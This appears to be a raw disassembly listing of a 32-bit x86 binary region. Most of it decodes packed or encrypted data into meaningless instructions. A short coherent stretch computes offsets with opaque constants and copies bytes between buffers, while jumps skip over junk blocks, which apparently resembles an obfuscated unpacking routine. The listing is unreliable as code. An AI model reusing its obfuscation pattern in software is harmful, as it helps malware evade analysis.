  40d904:	and    esi,DWORD PTR [esi]
  40d906:	fs sub BYTE PTR gs:[edi-0x68],cl
  40d90b:	sbb    DWORD PTR [edx],edi
  40d90d:	or     dl,al
  40d90f:	xlat   BYTE PTR ds:[ebx]
  40d910:	or     eax,0xc7fc88a1
  40d915:	or     dh,BYTE PTR [edx+0x403bcdde]
  40d91b:	cli    
  40d91c:	leave  
  40d91d:	(bad)  
  40d91e:	push   eax
  40d91f:	jecxz  0x40d933
  40d921:	cmp    BYTE PTR [ebx+0x24509b63],bl
  40d927:	fisub  DWORD PTR [ebx]
  40d929:	stos   BYTE PTR es:[edi],al
  40d92a:	mov    ecx,0x1de7b487
  40d92f:	pusha  
  40d930:	pop    ds
  40d931:	mov    esp,0x640aa927
  40d936:	pop    eax
  40d937:	mov    ds:0x228a0a0f,al
  40d93c:	loop   0x40d940
  40d93e:	pusha  
  40d93f:	cmp    edx,DWORD PTR [edi+0x35]
  40d942:	add    BYTE PTR [eax],ah
  40d944:	gs lahf 
  40d946:	fisub  WORD PTR [ebp+edx*2-0x22efeea0]
  40d94d:	lock push es
  40d94f:	data16 js 0x40d965
  40d952:	pop    es
  40d953:	rcl    DWORD PTR [ecx],1
  40d955:	test   ch,ch
  40d957:	inc    esi
  40d958:	enter  0x5a7f,0xfb
  40d95c:	pushf  
  40d95d:	aam    0xfa
  40d95f:	popa   
  40d960:	sbb    dl,BYTE PTR [ebx+0x25]
  40d963:	call   0xcefe:0xa0d57b8f
  40d96a:	xchg   esp,eax
  40d96b:	jb     0x40d9b6
  40d96d:	push   edx
  40d96e:	mov    ah,BYTE PTR cs:[ebx-0x38]
  40d972:	mov    fs,edi
  40d974:	and    edx,edi
  40d976:	mov    BYTE PTR [eax-0x55],ch
  40d979:	(bad)  
  40d97a:	repz pusha 
  40d97c:	inc    esi
  40d97d:	mov    ah,0x83
  40d97f:	jmp    0x40d9d1
  40d981:	mov    ebp,DWORD PTR [esi-0x258add04]
  40d987:	push   ecx
  40d988:	dec    edi
  40d989:	cs xchg esp,eax
  40d98b:	(bad)  
  40d98c:	add    esp,DWORD PTR [esi+eax*1+0x2b9d2b82]
  40d993:	inc    ebx
  40d994:	cmp    al,0x97
  40d996:	add    eax,edx
  40d998:	stos   DWORD PTR es:[edi],eax
  40d999:	sti    
  40d99a:	xor    DWORD PTR [edi-0x60abbdcb],edx
  40d9a0:	mov    ecx,0x3413b64a
  40d9a5:	dec    ebp
  40d9a6:	xor    dh,BYTE PTR [esi+0x5a]
  40d9a9:	jns    0x40d9e6
  40d9ab:	mov    ebx,cs
  40d9ad:	iret   
  40d9ae:	dec    edx
  40d9af:	push   0x55d5c153
  40d9b4:	aam    0xf2
  40d9b6:	outs   dx,BYTE PTR ds:[esi]
  40d9b7:	pop    esp
  40d9b8:	imul   eax,DWORD PTR [esi+0x706dfd67],0x59
  40d9bf:	add    esp,DWORD PTR [ebx]
  40d9c1:	call   0x714:0xb2e1f1a8
  40d9c8:	outs   dx,BYTE PTR ds:[esi]
  40d9c9:	cdq    
  40d9ca:	cli    
  40d9cb:	out    dx,al
  40d9cc:	jp     0x40d98f
  40d9ce:	call   0x1657:0xe55a4dea
  40d9d5:	and    dl,BYTE PTR [edi]
  40d9d7:	(bad)  
  40d9d8:	loopne 0x40d964
  40d9da:	lahf   
  40d9db:	xor    BYTE PTR [ecx+0x75e01368],ah
  40d9e1:	imul   edi,DWORD PTR [eax],0x16
  40d9e4:	daa    
  40d9e5:	(bad)  [edi+eax*8]
  40d9e8:	or     eax,0xae12c837
  40d9ed:	inc    ebp
  40d9ee:	fist   WORD PTR [edi+ebx*2]
  40d9f1:	std    
  40d9f2:	mov    al,ds:0x305d0b1a
  40d9f7:	ret    0x37c4
  40d9fa:	fild   QWORD PTR [edi]
  40d9fc:	rcr    DWORD PTR [eax-0x77],1
  40d9ff:	fsubr  st(5),st
  40da01:	sbb    al,0x4c
  40da03:	jae    0x40d9e3
  40da05:	inc    ebx
  40da06:	sbb    eax,0x744eb231
  40da0b:	mov    dh,0xb6
  40da0d:	mov    bl,0x11
  40da0f:	aas    
  40da10:	xorps  xmm3,XMMWORD PTR [eax+0x3a737ff5]
  40da17:	rcl    DWORD PTR [ecx+0x23f804f7],cl
  40da1d:	fld    TBYTE PTR [edx+0x9]
  40da20:	sahf   
  40da21:	xchg   ebp,eax
  40da22:	jnp    0x40d9ec
  40da24:	adc    DWORD PTR [ebx],ebx
  40da26:	ret    0x74e7
  40da29:	(bad)  
  40da2a:	push   DWORD PTR [ecx]
  40da2c:	(bad)  
  40da2d:	xchg   ebp,eax
  40da2e:	sbb    BYTE PTR [esi-0x37988b72],0x65
  40da35:	in     al,dx
  40da36:	imul   ecx,DWORD PTR [esi+eiz*1-0x46],0x65
  40da3b:	push   cs
  40da3c:	retf   0xded4
  40da3f:	jnp    0x40da3e
  40da41:	pop    dx
  40da43:	mov    dl,0x3f
  40da46:	sar    DWORD PTR [ecx+edx*4],1
  40da49:	jmp    0xd055:0xed21de4d
  40da50:	xchg   ebx,eax
  40da51:	dec    eax
  40da52:	mov    ah,0x24
  40da54:	adc    BYTE PTR [edi-0x33],bl
  40da57:	pop    ecx
  40da58:	out    dx,eax
  40da59:	push   edi
  40da5a:	xchg   esp,eax
  40da5b:	jb     0x40d9f9
  40da5d:	or     DWORD PTR [ebx-0x22],0x62fc28a4
  40da64:	pusha  
  40da65:	push   0x538273c9
  40da6a:	inc    edx
  40da6b:	lahf   
  40da6c:	mov    bh,0x93
  40da6e:	dec    ebp
  40da6f:	in     eax,dx
  40da70:	(bad)  
  40da71:	mov    al,0xfe
  40da73:	dec    ebx
  40da74:	push   esp
  40da75:	jecxz  0x40da8e
  40da77:	rcr    BYTE PTR [edi+0x9],1
  40da7a:	jge    0x40da6a
  40da7c:	add    eax,DWORD PTR [edi-0x4e]
  40da7f:	xchg   edi,eax
  40da80:	into   
  40da81:	les    eax,FWORD PTR [edx]
  40da83:	and    ebx,DWORD PTR [esi-0x1c85e2dc]
  40da89:	(bad)  
  40da8a:	xlat   BYTE PTR ds:[ebx]
  40da8b:	sahf   
  40da8c:	leave  
  40da8d:	inc    ebp
  40da8e:	lods   al,BYTE PTR ds:[esi]
  40da8f:	out    dx,eax
  40da90:	and    DWORD PTR [ecx-0x273dd3cd],esi
  40da96:	inc    eax
  40da97:	or     ecx,DWORD PTR [esi]
  40da99:	rcr    DWORD PTR [ebp-0x4c4167ba],0xea
  40daa0:	(bad)  
  40daa1:	xchg   edi,eax
  40daa2:	or     dh,BYTE PTR [eax+0x55c5e946]
  40daa8:	inc    edi
  40daa9:	xor    DWORD PTR ds:0xb8e9800a,ecx
  40daaf:	mov    dh,ch
  40dab1:	icebp  
  40dab2:	std    
  40dab3:	cdq    
  40dab4:	jnp    0x40da9c
  40dab6:	xor    DWORD PTR [edi+0x35],ecx
  40dab9:	and    DWORD PTR [ebx+ebx*2-0x1c],0x89f799ff
  40dac1:	adc    DWORD PTR [ebx+edx*4-0x17cd2dc7],0xffffff87
  40dac9:	sbb    ah,BYTE PTR [ecx]
  40dacb:	stos   BYTE PTR es:[edi],al
  40dacc:	push   esi
  40dacd:	mov    dh,0x83
  40dacf:	and    ebx,edi
  40dad1:	sub    ah,BYTE PTR ds:0x31ad6214
  40dad7:	leave  
  40dad8:	pop    ss
  40dad9:	and    ecx,esp
  40dadb:	fisub  DWORD PTR [eax]
  40dadd:	pop    edx
  40dade:	rcr    DWORD PTR [edx+0x7e3b1aac],0xaa
  40dae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dae6:	sti    
  40dae7:	pop    ebx
  40dae8:	mov    ah,0x5d
  40daea:	sbb    eax,0xef68a93
  40daef:	adc    BYTE PTR [esi],0x90
  40daf2:	add    bh,BYTE PTR [esp]
  40daf5:	ss cmp al,0x80
  40daf8:	cmp    al,0x4a
  40dafa:	lds    eax,FWORD PTR [edi-0x432023b2]
  40db00:	dec    edx
  40db01:	call   0xf38e:0xa7298aee
  40db08:	sbb    esi,DWORD PTR [edi-0x5e60213e]
  40db0e:	xchg   DWORD PTR [edx],edx
  40db10:	xlat   BYTE PTR ds:[ebx]
  40db11:	push   ds
  40db12:	and    DWORD PTR [esi-0x6f2be51d],esi
  40db18:	cmc    
  40db19:	push   edx
  40db1a:	cmp    dl,BYTE PTR [ecx-0x50]
  40db1d:	xor    DWORD PTR [eax+0x5d],0x3b
  40db21:	cld    
  40db22:	dec    esi
  40db23:	inc    ecx
  40db24:	or     eax,0x1dd4f540
  40db29:	cli    
  40db2a:	fisubr DWORD PTR [edx+0x7da97065]
  40db30:	pop    ds
  40db31:	push   ecx
  40db32:	(bad)  
  40db33:	jl     0x40db97
  40db35:	imul   ebx,esi,0x51
  40db38:	xchg   DWORD PTR [ecx+eiz*4-0x35a8616b],edx
  40db3f:	fnstsw WORD PTR [ebp+eiz*2+0x458b5052]
  40db46:	or     BYTE PTR [ecx-0x37],ch
  40db49:	add    DWORD PTR [esi],ebp
  40db4b:	add    BYTE PTR [eax],al
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40dbcc
  40db97:	sub    al,0xcb
  40db99:	jo     0x40dbf6
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [edi-0x75],cl
  40dba4:	out    0x30,al
  40dba6:	outs   dx,BYTE PTR ds:[esi]
  40dba7:	adc    BYTE PTR [ebx],dh
  40dba9:	cmp    eax,0xe5e82957
  40dbae:	stc    
  40dbaf:	jle    0x40db9d
  40dbb1:	lea    eax,[ebp-0x24560140]
  40dbb7:	cmc    
  40dbb8:	sub    al,0x1
  40dbba:	or     eax,0x8133fc79
  40dbbf:	gs pop ecx
  40dbc1:	lock std 
  40dbc3:	dec    ecx
  40dbc4:	and    ch,BYTE PTR [edx-0x2045c9a8]
  40dbca:	cmp    ah,cl
  40dbcc:	xchg   edx,eax
  40dbcd:	dec    edi
  40dbce:	inc    edi
  40dbcf:	shr    DWORD PTR [esi+0x79],0x8e
  40dbd3:	sub    BYTE PTR [ebp-0x5140acda],al
  40dbd9:	mov    ecx,0xba960214
  40dbde:	ss fs jp 0x40db9c
  40dbe2:	ret    0x3c9f
  40dbe5:	push   cs
  40dbe6:	scas   al,BYTE PTR es:[edi]
  40dbe7:	xor    al,0x41
  40dbe9:	je     0x40dc3f
  40dbeb:	les    eax,FWORD PTR [ebp-0xb7d2a1a]
  40dbf1:	nop
  40dbf2:	es adc eax,0xa799b46e
  40dbf8:	xchg   edx,eax
  40dbf9:	xchg   esi,eax
  40dbfa:	cs xchg ebp,eax
  40dbfc:	xor    al,0x1a
  40dbfe:	rcl    BYTE PTR [eax],0x27
  40dc01:	(bad)  
  40dc02:	out    0xb3,al
  40dc04:	inc    ebx
  40dc05:	lahf   
  40dc06:	add    eax,0xf3747e5e
  40dc0b:	sub    al,0x43
  40dc0d:	or     bh,ch
  40dc0f:	push   ss
  40dc10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc11:	cmp    BYTE PTR [ebx+0x4c58192],al
  40dc17:	jae    0x40dbf0
  40dc19:	xchg   ebp,eax
  40dc1a:	xchg   edi,eax
  40dc1b:	aam    0x3
  40dc1d:	retf   
  40dc1e:	hlt    
  40dc1f:	mov    BYTE PTR [esi+0x72],al
  40dc22:	daa    
  40dc23:	add    BYTE PTR [ecx+0x1ef6a62d],bh
  40dc29:	nop
  40dc2a:	pop    edi
  40dc2b:	ja     0x40dc27
  40dc2d:	push   eax
  40dc2e:	mov    ah,0x86
  40dc30:	out    dx,eax
  40dc31:	inc    ebp
  40dc32:	test   eax,0x980ec487
  40dc37:	push   edi
  40dc38:	push   cs
  40dc39:	rcr    BYTE PTR [esi-0x4024e10],0xb6
  40dc40:	or     bh,BYTE PTR [edx]
  40dc42:	xor    al,0xe2
  40dc44:	in     eax,0x25
  40dc46:	test   al,0x1
  40dc48:	mov    dl,0x84
  40dc4a:	add    ebp,DWORD PTR [esi+0x403106b7]
  40dc50:	xchg   BYTE PTR [edi],dl
  40dc52:	ins    DWORD PTR es:[edi],dx
  40dc53:	call   edi
  40dc55:	stc    
  40dc56:	or     eax,0xe41526a0
  40dc5b:	data16 jle 0x40dc26
  40dc5e:	lods   eax,DWORD PTR ds:[esi]
  40dc5f:	xlat   BYTE PTR ds:[ebx]
  40dc60:	mov    ch,0x2e
  40dc62:	gs pop esp
  40dc64:	bswap  ebp
  40dc66:	aas    
  40dc67:	ins    DWORD PTR es:[edi],dx
  40dc68:	pop    eax
  40dc69:	add    al,0xb8
  40dc6b:	xchg   DWORD PTR [edi+ecx*2],esp
  40dc6e:	popa   
  40dc6f:	jb     0x40dca5
  40dc71:	sbb    al,0x15
  40dc73:	pop    es
  40dc74:	sub    al,0x0
  40dc76:	je     0x40dcaf
  40dc78:	add    DWORD PTR ds:0xa1c53eb5,0x54
  40dc7f:	mov    WORD PTR [edx+0x4b36d569],ss
  40dc85:	xlat   BYTE PTR ds:[ebx]
  40dc86:	jle    0x40dc0a
  40dc88:	popf   
  40dc89:	cs jae 0x40dc99
  40dc8c:	bound  eax,QWORD PTR [eax-0x2]
  40dc8f:	push   ds
  40dc90:	out    dx,eax
  40dc91:	jns    0x40dcc9
  40dc93:	or     ebp,edx
  40dc95:	ds sbb al,0xd6
  40dc98:	xchg   esp,eax
  40dc99:	fnstenv [eax+0x5d91a7c2]
  40dc9f:	jl     0x40dd11
  40dca1:	mov    DWORD PTR [edx-0x14],edi
  40dca4:	icebp  
  40dca5:	out    0xdd,eax
  40dca7:	loope  0x40dd1f
  40dca9:	int3   
  40dcaa:	cmp    esi,ebp
  40dcac:	imul   ecx,DWORD PTR [edx],0xffffff9c
  40dcaf:	pop    ds
  40dcb0:	mov    BYTE PTR [eax+0x7b],bh
  40dcb3:	mov    ecx,0x73e9b046
  40dcb8:	cmp    BYTE PTR [eax+0x42],0x7b
  40dcbc:	mov    ch,BYTE PTR fs:[edx+0x50]
  40dcc0:	es mov edi,0x233df35a
  40dcc6:	xchg   ebx,eax
  40dcc7:	lea    ebp,[edi]
  40dcc9:	xor    BYTE PTR [eax],ah
  40dccb:	xor    DWORD PTR [ebx+0xf],esi
  40dcce:	push   ss
  40dccf:	(bad)  
  40dcd0:	fadd   st,st(1)
  40dcd2:	in     eax,0x55
  40dcd4:	fdivr  QWORD PTR [ebx+ebx*8+0x2446d9c4]
  40dcdb:	ss lahf 
  40dcdd:	mov    edx,0xa0d96c0e
  40dce2:	aam    0x59
  40dce4:	push   esi
  40dce5:	and    DWORD PTR [eax+0x7f],esi
  40dce8:	jae    0x40dd4e
  40dcea:	jmp    0xccae:0xec9e508e
  40dcf1:	push   ecx
  40dcf2:	push   es
  40dcf3:	mov    ebx,0x49d86e8c
  40dcf8:	neg    edi
  40dcfa:	dec    ebx
  40dcfb:	sbb    dl,BYTE PTR [esi+edx*4+0x49671d05]
  40dd02:	les    ebx,FWORD PTR [edi+0x22aa98e7]
  40dd08:	ret    0x92a0
  40dd0b:	pusha  
  40dd0c:	jbe    0x40dcc3
  40dd0e:	bound  edx,QWORD PTR [eax]
  40dd10:	ror    eax,cl
  40dd12:	add    ah,BYTE PTR [ebp-0x3]
  40dd15:	jo     0x40dcbb
  40dd17:	test   eax,0x9b4888f
  40dd1c:	dec    edx
  40dd1d:	call   0x555afa71
  40dd22:	aam    0x8a
  40dd24:	sub    BYTE PTR [edx+0x38],bh
  40dd27:	cmc    
  40dd28:	shl    DWORD PTR [edx+0x62c8a622],cl
  40dd2e:	or     BYTE PTR [esi-0x5156dc41],0xc5
  40dd35:	jno    0x40dcdc
  40dd37:	fidivr DWORD PTR [edx-0x53c1076c]
  40dd3d:	push   eax
  40dd3e:	jae    0x40dcee
  40dd40:	dec    ebx
  40dd41:	xor    ah,BYTE PTR [edi-0x3f]
  40dd44:	add    al,0x6d
  40dd46:	data16 add BYTE PTR [eax+0x65],al
  40dd4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd4b:	es sub al,0xb8
  40dd4e:	daa    
  40dd4f:	outs   dx,BYTE PTR ds:[esi]
  40dd50:	xchg   edx,eax
  40dd51:	add    cl,BYTE PTR [edx]
  40dd53:	gs xor eax,0x139f4224
  40dd59:	mov    esi,0x95a0a25a
  40dd5e:	push   eax
  40dd5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd60:	cdq    
  40dd61:	xchg   ecx,eax
  40dd62:	pushf  
  40dd63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd64:	arpl   WORD PTR [edi+0x3],sp
  40dd67:	push   ebx
  40dd68:	adc    ecx,eax
  40dd6a:	push   esi
  40dd6b:	push   ecx
  40dd6c:	and    ecx,DWORD PTR [edi+eax*4]
  40dd6f:	idiv   DWORD PTR [ecx]
  40dd71:	sbb    esp,DWORD PTR [eax+ebx*8]
  40dd74:	adc    DWORD PTR [esi],edx
  40dd76:	in     al,0x32
  40dd78:	xchg   BYTE PTR [eax-0x6a],dh
  40dd7b:	dec    edi
  40dd7c:	arpl   WORD PTR [ebx-0x3c],di
  40dd7f:	or     DWORD PTR [ecx-0x71],edx
  40dd82:	leave  
  40dd83:	jne    0x40dd55
  40dd85:	sbb    eax,0x7dd96e3f
  40dd8a:	mov    edi,0x7184007d
  40dd8f:	cmp    DWORD PTR [ebx-0x36],esi
  40dd92:	mov    dl,0x8a
  40dd94:	adc    eax,0xe8e54d0b
  40dd99:	jg     0x40dd47
  40dd9b:	xchg   edi,eax
  40dd9c:	dec    esp
  40dd9d:	shl    BYTE PTR [edi+0x67],cl
  40dda0:	adc    DWORD PTR [edi-0x8ccd5b1],ebx
  40dda6:	jb     0x40dd7c
  40dda8:	mov    ds:0x5eae85cb,eax
  40ddad:	out    0x39,al
  40ddaf:	mov    ebx,0x1f78b6b2
  40ddb4:	xlat   BYTE PTR ds:[ebx]
  40ddb5:	sbb    esp,ebx
  40ddb7:	adc    esi,DWORD PTR [eax-0xe]
  40ddba:	in     eax,0xfd
  40ddbc:	adc    DWORD PTR [edx+ecx*2+0x4b],esp
  40ddc0:	lahf   
  40ddc1:	outs   dx,DWORD PTR ds:[esi]
  40ddc2:	mov    eax,ds:0x8933de6c
  40ddc7:	jnp    0x40dd8b
  40ddc9:	mov    esi,0x8a19a513
  40ddce:	mov    WORD PTR [eax+0x78a57e63],ds
  40ddd4:	xchg   edx,eax
  40ddd5:	aas    
  40ddd6:	stc    
  40ddd7:	pop    es
  40ddd8:	cdq    
  40ddd9:	mov    esp,0x6a6f553f
  40ddde:	xchg   ecx,eax
  40dddf:	sbb    eax,0x9fecf1ce
  40dde4:	out    0x22,al
  40dde6:	(bad)  
  40dde7:	sbb    al,BYTE PTR [edi+0x29]
  40ddea:	mov    al,ds:0x3e7ef230
  40ddef:	aam    0xee
  40ddf1:	cdq    
  40ddf2:	in     al,0x36
  40ddf4:	jbe    0x40de18
  40ddf6:	push   esi
  40ddf7:	dec    esi
  40ddf8:	cs xor eax,0x49065320
  40ddfe:	in     eax,dx
  40ddff:	and    al,0x4b
  40de01:	inc    edi
  40de02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de03:	lock adc BYTE PTR [ebx+0x1b],0x8e
  40de08:	and    dh,BYTE PTR [esi+esi*1+0x51]
  40de0c:	das    
  40de0d:	aas    
  40de0e:	adc    DWORD PTR ds:0x8843a91d,esi
  40de14:	jp     0x40de80
  40de16:	scas   al,BYTE PTR es:[edi]
  40de17:	imul   ecx,DWORD PTR [eax+0x2ddf8ae7],0xffffff87
  40de1e:	sbb    eax,esi
  40de20:	(bad)  
  40de21:	mov    esi,0x798a1237
  40de26:	lock mov eax,ds:0xbd5d01c7
  40de2c:	add    ch,cl
  40de2e:	mov    ebx,edx
  40de30:	call   0x688a3244
  40de35:	(bad)  [esi+0x6bc6297e]
  40de3b:	ret    0x2e49
  40de3e:	jbe    0x40ddeb
  40de40:	ins    BYTE PTR es:[edi],dx
  40de41:	daa    
  40de42:	sub    ah,BYTE PTR [ebx]
  40de44:	aad    0xda
  40de46:	sbb    DWORD PTR [eax-0x49],ebx
  40de49:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40de50:	mov    DWORD PTR [ebp-0x14],0x13cd
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422518
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40de4f
  40deca:	mov    al,ds:0xcc14708b
  40decf:	sbb    BYTE PTR [eax],bl
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    BYTE PTR [edi],cl
  40ded6:	cmp    ebp,ecx
  40ded8:	cs jno 0x40de95
  40dedb:	adc    eax,0x959ea237
  40dee0:	mov    eax,0x5a395b5b
  40dee5:	int3   
  40dee6:	sti    
  40dee7:	push   es
  40dee8:	jge    0x40de70
  40deea:	imul   BYTE PTR [edx-0x3f]
  40deed:	out    dx,al
  40deee:	imul   ecx,DWORD PTR [esi],0xf04eefb4
  40def4:	jae    0x40dea5
  40def6:	or     al,0xe4
  40def8:	sbb    DWORD PTR [edx],ecx
  40defa:	mov    BYTE PTR [edi],bh
  40defc:	mov    BYTE PTR [ecx],ah
  40defe:	push   es
  40deff:	mov    WORD PTR [esi],ds
  40df01:	xchg   edi,eax
  40df02:	or     al,0x6f
  40df04:	call   0x66b08e65
  40df09:	cld    
  40df0a:	hlt    
  40df0b:	cld    
  40df0c:	xchg   edx,eax
  40df0d:	pop    ds
  40df0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df0f:	and    eax,0x5d481de6
  40df14:	dec    edi
  40df15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df16:	jne    0x40df23
  40df18:	fwait
  40df19:	rcr    BYTE PTR [esi],cl
  40df1b:	add    BYTE PTR [ebp+esi*2+0x1cc0cb46],ch
  40df22:	in     al,0x3d
  40df24:	test   eax,0xb72cef3e
  40df29:	(bad)  
  40df2a:	jae    0x40df6b
  40df2c:	loop   0x40defd
  40df2e:	and    al,0xba
  40df30:	mov    bl,0xc6
  40df32:	pop    ds
  40df33:	leave  
  40df34:	xchg   edx,eax
  40df35:	push   es
  40df36:	xchg   esi,eax
  40df37:	mov    esp,0xecc86807
  40df3c:	mov    ebp,ebp
  40df3e:	push   0xffffff96
  40df40:	or     BYTE PTR [edi-0x2f259283],dh
  40df46:	mul    BYTE PTR [ecx+0x31]
  40df49:	add    ecx,0xfffffff5
  40df4c:	rcl    DWORD PTR [edi+esi*1+0xc],cl
  40df50:	jmp    0x9872:0x9840ea81
  40df57:	stos   BYTE PTR es:[edi],al
  40df58:	cmc    
  40df59:	cs das 
  40df5b:	ret    0xe72a
  40df5e:	inc    esp
  40df5f:	stos   DWORD PTR es:[edi],eax
  40df60:	mov    dh,0x7b
  40df62:	int3   
  40df63:	or     ebp,DWORD PTR [ebp-0x5751996]
  40df69:	das    
  40df6a:	retf   
  40df6b:	(bad)  
  40df6c:	(bad)  
  40df6e:	cwde   
  40df6f:	sbb    ebx,DWORD PTR [edi]
  40df71:	retf   
  40df72:	cli    
  40df73:	pop    es
  40df74:	in     eax,0xe8
  40df76:	jmp    0xcb39a952
  40df7b:	jne    0x40dff7
  40df7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df7e:	out    dx,eax
  40df7f:	(bad)  
  40df80:	pop    ss
  40df81:	pop    ds
  40df82:	or     BYTE PTR [ecx+edi*1],ah
  40df85:	rcr    BYTE PTR gs:[ecx+0x1d],0xe7
  40df8a:	pop    es
  40df8b:	hlt    
  40df8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df8d:	mov    ds:0x579ac7fc,al
  40df92:	xor    BYTE PTR [edi-0x50],bl
  40df95:	sub    edx,DWORD PTR [edx*1-0x186a0128]
  40df9c:	xor    eax,0xb597e95e
  40dfa1:	iret   
  40dfa2:	xchg   ch,al
  40dfa4:	cmp    esp,eax
  40dfa6:	out    dx,al
  40dfa7:	or     ah,bh
  40dfa9:	fisubr WORD PTR [ecx+0x2d]
  40dfac:	xchg   ebx,eax
  40dfad:	mov    esi,0x291bbd99
  40dfb2:	pop    ebp
  40dfb3:	xor    eax,0xe0fc7cce
  40dfb8:	xor    BYTE PTR [ecx+0x6a],dl
  40dfbb:	inc    DWORD PTR [ecx+0x620dbdd]
  40dfc1:	pop    edi
  40dfc2:	ins    BYTE PTR es:[edi],dx
  40dfc3:	mov    bh,0x5
  40dfc5:	mov    ebp,0x98cb7b53
  40dfca:	mov    dh,0x8c
  40dfcc:	lea    ebx,[edx-0x30]
  40dfcf:	pop    esi
  40dfd0:	pop    ebp
  40dfd1:	pop    ecx
  40dfd2:	add    ch,0x16
  40dfd5:	and    al,0xd
  40dfd7:	add    BYTE PTR [eax+0x705f7199],al
  40dfdd:	or     cl,al
  40dfdf:	pop    ecx
  40dfe0:	out    dx,al
  40dfe1:	(bad)  
  40dfe2:	lea    ebx,ds:[edx]
  40dfe5:	pop    ss
  40dfe6:	xchg   esp,ebp
  40dfe8:	push   esp
  40dfe9:	(bad)  
  40dfea:	cmp    DWORD PTR [edi-0x10068645],ebx
  40dff0:	mov    edi,eax
  40dff2:	imul   DWORD PTR [eax]
  40dff4:	xchg   edi,eax
  40dff5:	fcomp  QWORD PTR [esi+0x3e]
  40dff8:	or     eax,0x6cdf1bcb
  40dffd:	psrlw  mm0,mm0
  40e000:	and    eax,0x1fe481b5
  40e005:	dec    BYTE PTR [ebp+0x1]
  40e008:	imul   esp,eax,0x64abbfbe
  40e00e:	add    al,0x38
  40e010:	dec    eax
  40e011:	leave  
  40e012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e013:	lods   al,BYTE PTR ds:[esi]
  40e014:	in     eax,0x90
  40e016:	in     eax,dx
  40e017:	mov    bl,0x5f
  40e019:	das    
  40e01a:	outs   dx,BYTE PTR ds:[esi]
  40e01b:	aaa    
  40e01c:	mov    bl,0x1a
  40e01e:	fnstcw WORD PTR [ebx-0x5dc46d0]
  40e024:	mov    ch,0xcf
  40e026:	adc    DWORD PTR [ecx+edx*8],0xf01a20f6
  40e02d:	ins    BYTE PTR es:[edi],dx
  40e02e:	push   eax
  40e02f:	test   eax,ebx
  40e031:	stos   BYTE PTR es:[edi],al
  40e032:	push   ecx
  40e033:	cmc    
  40e034:	jp     0x40e04b
  40e036:	xor    edi,ebx
  40e038:	and    BYTE PTR [edx-0x18],ah
  40e03b:	idiv   cl
  40e03d:	sub    ah,bl
  40e03f:	mov    BYTE PTR [ecx],dl
  40e041:	dec    esi
  40e042:	and    eax,0x78ab21c6
  40e047:	(bad)  
  40e048:	cmp    DWORD PTR [eax+ebp*8-0x4e50d58a],eax
  40e04f:	fisttp WORD PTR [ecx]
  40e051:	scas   eax,DWORD PTR es:[edi]
  40e052:	sbb    eax,0xbd2b7c2f
  40e057:	xchg   esi,eax
  40e058:	ficomp DWORD PTR ds:0x586dd2dd
  40e05e:	mov    ebp,0xc04c36a5
  40e063:	dec    esp
  40e064:	arpl   dx,ax
  40e066:	stc    
  40e067:	jne    0x40e01f
  40e069:	shr    DWORD PTR [ebp-0x2ce63fa4],0x76
  40e070:	ins    DWORD PTR es:[edi],dx
  40e071:	and    bl,BYTE PTR [ebp+0x7d9187d7]
  40e077:	mov    cl,ah
  40e079:	pop    edx
  40e07a:	adc    BYTE PTR [eax+0x3d],0x5a
  40e07e:	test   DWORD PTR [ecx],eax
  40e080:	enter  0xadac,0x4e
  40e084:	in     al,0x19
  40e086:	adc    ebx,DWORD PTR [edx]
